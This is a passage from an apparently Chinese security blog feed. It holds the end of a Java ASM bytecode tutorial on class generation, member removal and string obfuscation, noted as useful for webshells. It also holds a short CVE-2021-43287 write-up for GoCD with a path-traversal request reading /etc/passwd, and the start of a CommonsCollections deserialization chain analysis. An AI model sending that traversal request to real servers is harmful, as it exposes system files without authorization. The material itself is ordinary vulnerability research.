class="title class_">ClassReader</span>(Test.class.getName());</span><br><span class="line">        classReader.accept(myClassVisitors,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/63966847/150936112-ab83838c-4f67-4102-9816-ce2afa734559.png" alt="image-20220125122358358"></p><p><img src="https://user-images.githubusercontent.com/63966847/150936121-914e2c3a-6019-4f01-91ed-38c5453cab39.png" alt="image-20220125122420194"></p><blockquote><p>该部分也是GI的核心。<a href="https://xz.aliyun.com/t/10363">https://xz.aliyun.com/t/10363</a></p></blockquote><h2 id="生成类"><a href="#生成类" class="headerlink" title="生成类"></a>生成类</h2><blockquote><p>感觉用于webshell中。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.MethodVisitor;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WriteClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassWriter</span> <span class="variable">classWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassWriter</span>(ClassWriter.COMPUTE_MAXS);</span><br><span class="line">        <span class="comment">// java1.8 public修饰 路径 签名 父类 接口</span></span><br><span class="line">        classWriter.visit(V1_8, ACC_PUBLIC, <span class="string">&quot;com/firebasky/utils/asm/learn/Learn2Test&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;java/lang/Object&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//public和static修饰 方法名 描述符 签名 异常</span></span><br><span class="line">        <span class="type">MethodVisitor</span> <span class="variable">render</span> <span class="operator">=</span> classWriter.visitMethod(ACC_PUBLIC + ACC_STATIC, <span class="string">&quot;render&quot;</span>, <span class="string">&quot;()V&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//插入一个字段是方法里面插入 操作码 路径 名字 描述符</span></span><br><span class="line">        render.visitFieldInsn(GETSTATIC, <span class="string">&quot;java/lang/System&quot;</span>, <span class="string">&quot;out&quot;</span>, <span class="string">&quot;Ljava/io/PrintStream;&quot;</span>);</span><br><span class="line">        <span class="comment">//插入一个ldc</span></span><br><span class="line">        render.visitLdcInsn(<span class="string">&quot;Hello asm!&quot;</span>);</span><br><span class="line">        <span class="comment">//插入一个方法 操作码 路径 方法名 参数 是否为接口的方法</span></span><br><span class="line">        render.visitMethodInsn(INVOKEVIRTUAL, <span class="string">&quot;java/io/PrintStream&quot;</span>, <span class="string">&quot;println&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)V&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        <span class="comment">//插入返回值</span></span><br><span class="line">        render.visitInsn(RETURN);</span><br><span class="line">        <span class="comment">//设置栈和局部变量大小</span></span><br><span class="line">        render.visitMaxs(<span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">//结束</span></span><br><span class="line">        render.visitEnd();</span><br><span class="line">        classWriter.visitEnd();</span><br><span class="line">        <span class="comment">//生成文件</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = classWriter.toByteArray();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;d://1.class&quot;</span>);</span><br><span class="line">        outputStream.write(bytes);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成的类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.firebasky.utils.asm.learn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Learn2Test</span> &#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">render</span><span class="params">()</span> &#123;</span><br><span class="line">          System.out.println(<span class="string">&quot;Hello asm!&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="加载或移除类成员"><a href="#加载或移除类成员" class="headerlink" title="加载或移除类成员"></a>加载或移除类成员</h2><p>主程序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassReader;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Learn3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassReader</span> <span class="variable">classReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(Test.class.getName());</span><br><span class="line">        <span class="type">ClassWriter</span> <span class="variable">classWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassWriter</span>(ClassWriter.COMPUTE_MAXS);</span><br><span class="line">        <span class="type">MyClassVisitor</span> <span class="variable">myClassVisitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClassVisitor</span>(classWriter);</span><br><span class="line">        classReader.accept(myClassVisitor,<span class="number">0</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = classWriter.toByteArray();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;d://1.class&quot;</span>);</span><br><span class="line">        outputStream.write(bytes);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MyClassVisitor类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassVisitor;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.FieldVisitor;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.MethodVisitor;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassVisitor</span> <span class="keyword">extends</span> <span class="title class_">ClassVisitor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClassVisitor</span><span class="params">(ClassWriter classWriter)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(ASM5, classWriter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> FieldVisitor <span class="title function_">visitField</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature, Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(name.equals(<span class="string">&quot;aBoolean&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.visitField(access, name, desc, signature, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature,String[] exceptions)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(name.equals(<span class="string">&quot;render&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitEnd</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.visitField(ACC_PRIVATE,<span class="string">&quot;name&quot;</span>,<span class="string">&quot;Ljava/lang/String;&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>).visitEnd();</span><br><span class="line">        <span class="built_in">super</span>.visitMethod(ACC_PRIVATE,<span class="string">&quot;name&quot;</span>,<span class="string">&quot;(Ljava/lang/String;)V&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>).visitEnd();</span><br><span class="line">        <span class="built_in">super</span>.visitEnd();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改之后的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.firebasky.utils.asm.learn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">     <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span> &#123;</span><br><span class="line">          <span class="built_in">this</span>.aBoolean = <span class="literal">true</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">name</span><span class="params">(String var1)</span> &#123;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="创建对象和数组"><a href="#创建对象和数组" class="headerlink" title="创建对象和数组"></a>创建对象和数组</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.MethodVisitor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Learn4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassWriter</span> <span class="variable">classWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassWriter</span>(ClassWriter.COMPUTE_MAXS);</span><br><span class="line">        <span class="type">MethodVisitor</span> <span class="variable">methodVisitor</span> <span class="operator">=</span> classWriter.visitMethod(ACC_PUBLIC, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;()V&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        methodVisitor.visitTypeInsn(NEW,<span class="string">&quot;java/lang/String&quot;</span>);</span><br><span class="line">        methodVisitor.visitLdcInsn(<span class="string">&quot;xxx&quot;</span>);<span class="comment">//常量</span></span><br><span class="line">        methodVisitor.visitMethodInsn(INVOKEVIRTUAL,<span class="string">&quot;java/lang/String&quot;</span>,<span class="string">&quot;&lt;init&gt;&quot;</span>,<span class="string">&quot;(Ljava/lang/String;)V&quot;</span>,<span class="literal">false</span>);</span><br><span class="line">        <span class="comment">//生成文件</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = classWriter.toByteArray();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;d://1.class&quot;</span>);</span><br><span class="line">        outputStream.write(bytes);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">methodVisitor.visitIntInsn(SIPUSH,<span class="number">2</span>);<span class="comment">//数组长度</span></span><br><span class="line">methodVisitor.visitIntInsn(NEWARRAY,T_BYTE);<span class="comment">//类型是byte</span></span><br><span class="line">methodVisitor.visitInsn(DUP);<span class="comment">//压</span></span><br><span class="line">methodVisitor.visitIntInsn(SIPUSH,<span class="number">0</span>);<span class="comment">//插入数组0位置</span></span><br><span class="line">methodVisitor.visitIntInsn(SIPUSH,<span class="number">1</span>);</span><br><span class="line">methodVisitor.visitInsn(AASTORE);<span class="comment">//保存</span></span><br></pre></td></tr></table></figure><h2 id="字符串混淆"><a href="#字符串混淆" class="headerlink" title="字符串混淆"></a>字符串混淆</h2><p>就是在写入的时候做一个转换。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassReader;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Learn5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ClassReader</span> <span class="variable">classReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(Test.class.getName());</span><br><span class="line">        <span class="type">ClassWriter</span> <span class="variable">classWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassWriter</span>(ClassWriter.COMPUTE_MAXS);</span><br><span class="line">        <span class="type">MyClassVisitor1</span> <span class="variable">myClassVisitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClassVisitor1</span>(classWriter);</span><br><span class="line">        classReader.accept(myClassVisitor,<span class="number">0</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = classWriter.toByteArray();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;d://1.class&quot;</span>);</span><br><span class="line">        outputStream.write(bytes);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MyClassVisitor1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassVisitor;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.MethodVisitor;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 拦截字符串修改</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassVisitor1</span> <span class="keyword">extends</span> <span class="title class_">ClassVisitor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClassVisitor1</span><span class="params">(ClassWriter classWriter)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(ASM5, classWriter);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature, String[] exceptions)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MethodVisitor</span>(api,<span class="built_in">super</span>.visitMethod(access,name,desc,signature,exceptions)) &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitLdcInsn</span><span class="params">(Object cst)</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(cst <span class="keyword">instanceof</span> String)&#123;</span><br><span class="line">                    <span class="type">byte</span>[] bytes = ((String) cst).getBytes(StandardCharsets.UTF_8);<span class="comment">//转换bytes</span></span><br><span class="line">                    mv.visitTypeInsn(NEW,<span class="string">&quot;java/lang/String&quot;</span>);</span><br><span class="line">                    mv.visitInsn(DUP);</span><br><span class="line">                    mv.visitIntInsn(SIPUSH,bytes.length);</span><br><span class="line">                    mv.visitIntInsn(NEWARRAY,T_BYTE);</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i&lt;bytes.length;i++)&#123;</span><br><span class="line">                        mv.visitInsn(DUP);</span><br><span class="line">                        mv.visitIntInsn(SIPUSH,i);</span><br><span class="line">                        mv.visitIntInsn(SIPUSH,bytes[i]);</span><br><span class="line">                        mv.visitInsn(AASTORE);</span><br><span class="line">                    &#125;</span><br><span class="line">                    mv.visitLdcInsn(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">                    mv.visitMethodInsn(INVOKEVIRTUAL,<span class="string">&quot;java/lang/String&quot;</span>,<span class="string">&quot;&lt;init&gt;&quot;</span>,<span class="string">&quot;([BLjava/lang/String;)V&quot;</span>,<span class="literal">false</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">super</span>.visitLdcInsn(cst);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将字符串转换成bytes</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE 2021 43287</title>
      <link href="/2022/11/10/CVE-2021-43287/"/>
      <url>/2022/11/10/CVE-2021-43287/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2021-43287"><a href="#CVE-2021-43287" class="headerlink" title="CVE 2021 43287"></a>CVE 2021 43287</h1><blockquote><p>GoCD 一款先进的持续集成和发布管理系统,由ThoughtWorks开发。（不要和Google的编程语言Go混淆了！）其前身为CruiseControl,是ThoughtWorks在做咨询和交付交付项目时自己开发的一款开源的持续集成工具。后来随着持续集成及持续部署的火热，ThoughtWorks专门成立了一个项目组，基于Cruise开发除了Go这款工具。ThoughtWorks开源持续交付工具Go。使用Go来建立起一个项目的持续部署pipeline是非常快的，非常方便。 GoCD的v20.6.0 - v21.2.0版本存在任意文件读取漏洞，可以通过/go/add-on/business-continuity/api/plugin?folderName=&amp;pluginName=../../../etc/passwd 对文件进行读取。</p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v20.6.0 - v21.2.0</span><br></pre></td></tr></table></figure><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p><img src="https://user-images.githubusercontent.com/63966847/149621578-1249eeb8-f454-48ac-8edc-c5385a69661d.png" alt="image-20220115201323862"></p><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p><img src="https://user-images.githubusercontent.com/63966847/149621580-174d710e-5900-4860-b877-6a67f115c13c.png" alt="image-20220115201231569"></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><a href="https://github.com/gocd/gocd/commit/41abc210ac4e8cfa184483c9ff1c0cc04fb3511c#diff-cc02ae4dc975bd7648bbbff5f5a2d98867674a767acc35c99d4cfd4d5a6fe488">https://github.com/gocd/gocd/commit/41abc210ac4e8cfa184483c9ff1c0cc04fb3511c#diff-cc02ae4dc975bd7648bbbff5f5a2d98867674a767acc35c99d4cfd4d5a6fe488</a></p><p><img src="https://user-images.githubusercontent.com/63966847/149621583-5334295f-a207-4da9-b5ad-1182bacf76d2.png" alt="image-20220115201143857"></p><p>删除了路由。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollection利用链</title>
      <link href="/2022/11/10/CommonsCollections/"/>
      <url>/2022/11/10/CommonsCollections/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections利用链"><a href="#CommonsCollections利用链" class="headerlink" title="CommonsCollections利用链"></a>CommonsCollections利用链</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>Apache Commons</code>是<code>Apache</code>开源的Java通用类项目在Java中项目中被广泛的使用，<code>Apache Commons</code>当中有一个组件叫做<code>Apache Commons Collections</code>，主要封装了Java的<code>Collection（集合）</code>相关类对象。</p><p>在<code>Commons Collections</code>中实现了一个<code>TransformedMap类</code>，该类是对 Java 标准数据结构类型<code>Map</code>接口的一个扩展。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变化，而具体的变换逻辑则由<code>Transformer</code>类定义，<code>Transformer</code>在<code>TransformedMap</code>实例化时作为参数传入。</p><p>本条链子的利用版本限制：<code>CommonsCollections 3.1 - 3.2.1</code></p><h2 id="接口类和实现类"><a href="#接口类和实现类" class="headerlink" title="接口类和实现类"></a>接口类和实现类</h2><h3 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h3><p><code>Transformer</code>是一个接口类，其功能是提供一个对象转换方法<code>transform</code>，源码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">  <span class="comment">// 将输入对象保持不变的转换为某个输出对象</span></span><br><span class="line">    Object <span class="title function_">transform</span><span class="params">(Object var1)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现<code>Transformer</code>接口的类有以下类<br><img src="/2022/11/10/CommonsCollections/image-20220830225100395.png" alt="image-20220830225100395"></p><p>其中一些实现和调用<code>Transformer</code>接口的重要类为：<code>ConstantTransformer</code>、<code>invokerTransformer</code>、<code>ChainedTransformer</code>和<code>TransformedMap</code>。</p><h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p><code>ConstantTransformer</code>类是<code>Transformer</code>接口其中的一个实现类，<code>ConstantTransformer</code>类重写了<code>transformer</code>方法，源码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">6374440726369055124L</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">NULL_INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>((Object)<span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object iConstant;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Transformer <span class="title function_">getInstance</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (Transformer)(constantToReturn == <span class="literal">null</span> ? NULL_INSTANCE : <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(constantToReturn));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span 